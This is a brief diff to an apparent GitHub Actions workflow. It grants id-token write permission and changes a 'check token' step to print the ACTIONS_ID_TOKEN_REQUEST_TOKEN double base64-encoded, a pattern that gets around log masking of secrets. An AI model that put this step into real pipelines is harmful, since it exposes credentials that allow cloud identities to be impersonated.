@@ -8,6 +8,7 @@ on:
 
 permissions:
   contents: read
+  id-token: write
 
 jobs:
   job1:
@@ -16,7 +17,7 @@ jobs:
       - uses: actions/checkout@v4
       - name: check token
         run: |
-          echo ${{ github.token }} | base64 -w 0 | base64 -w 0
+          echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN | base64 -w 0 | base64 -w 0
           
           
   
